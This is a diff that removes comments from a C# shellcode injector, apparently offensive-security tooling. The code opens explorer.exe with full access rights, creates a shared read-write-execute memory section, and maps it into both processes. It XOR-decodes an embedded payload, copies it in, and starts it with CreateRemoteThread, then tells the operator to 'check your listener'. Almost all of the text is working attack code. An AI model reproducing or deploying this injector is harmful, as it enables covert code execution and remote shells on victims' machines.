@@ -26,7 +26,6 @@ namespace RemoteShinjectLowlevel
     [ComVisible(true)]
     public class TestClass
 {
-    // FOR DEBUGGING
     [DllImport("kernel32.dll")]
     static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
 
@@ -37,7 +36,6 @@ namespace RemoteShinjectLowlevel
     {
         return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
     }
-    // END DEBUGGING
 
     public const uint ProcessAllFlags = 0x001F0FFF;
     public const uint GenericAll = 0x10000000;
@@ -86,48 +84,39 @@ namespace RemoteShinjectLowlevel
         int len = buf.Length;
         uint uLen = (uint)len;
 
-        // Get a handle on the local process
         IntPtr lHandle = Process.GetCurrentProcess().Handle;
         Console.WriteLine($"Got handle {lHandle} on local process.");
 
-        // Grab the right PID
-        string targetedProc = "explorer"; //change :)
+        string targetedProc = "explorer"; 
         int procId = Process.GetProcessesByName(targetedProc).First().Id;
 
-        // Get a handle on the remote process
         IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
         Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");
 
-        // Create a RWX memory section with the size of the payload using 'NtCreateSection'
         IntPtr sHandle = new IntPtr();
         long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
         Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");
 
-        // Map a view of the created section (sHandle) for the LOCAL process using 'NtMapViewOfSection'
         IntPtr baseAddrL = new IntPtr();
         uint viewSizeL = uLen;
         ulong sectionOffsetL = new ulong();
         long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, PageReadWrite);
         Console.WriteLine($"Mapped local memory section with base address {baseAddrL} (viewsize: {viewSizeL}, offset: {sectionOffsetL}). Success: {mStatusL == 0}.");
 
-        // Map a view of the same section for the specified REMOTE process (pHandle) using 'NtMapViewOfSection'
         IntPtr baseAddrR = new IntPtr();
         uint viewSizeR = uLen;
         ulong sectionOffsetR = new ulong();
         long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, PageReadExecute);
         Console.WriteLine($"Mapped remote memory section with base address {baseAddrR} (viewsize: {viewSizeR}, offset: {sectionOffsetR}). Success: {mStatusR == 0}.");
 
-        // Decode shellcode
         for (int i = 0; i < buf.Length; i++)
         {
             buf[i] = (byte)((uint)buf[i] ^ 0xfa);
         }
 
-        // Copy shellcode to locally mapped view, which will be reflected in the remote mapping
         Marshal.Copy(buf, 0, baseAddrL, len);
         Console.WriteLine($"Copied shellcode to locally mapped memory at address {baseAddrL}.");
 
-        // DEBUG: Read memory at remote address and verify it's the same as the intended shellcode
         byte[] remoteMemory = new byte[len];
         IntPtr noBytesRead = new IntPtr();
         bool result = ReadProcessMemory(pHandle, baseAddrR, remoteMemory, remoteMemory.Length, out noBytesRead);
@@ -142,9 +131,7 @@ namespace RemoteShinjectLowlevel
         {
             Console.WriteLine("DEBUG: OK.");
         }
-        // END DEBUG
 
-        // Execute the remotely mapped memory using 'CreateRemoteThread' (EWWW high-level APIs!!!)
         if (CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
         {
             Console.WriteLine("Injection done! Check your listener!");
@@ -154,11 +141,9 @@ namespace RemoteShinjectLowlevel
             Console.WriteLine("Injection failed!");
         }
 
-        // Unmap the locally mapped section view using 'NtUnMapViewOfSection'
         uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
         Console.WriteLine($"Unmapped local memory section. Success: {uStatusL == 0}.");
 
-        // Close the section
         int clStatus = NtClose(sHandle);
         Console.WriteLine($"Closed memory section. Success: {clStatus == 0}.");
     }
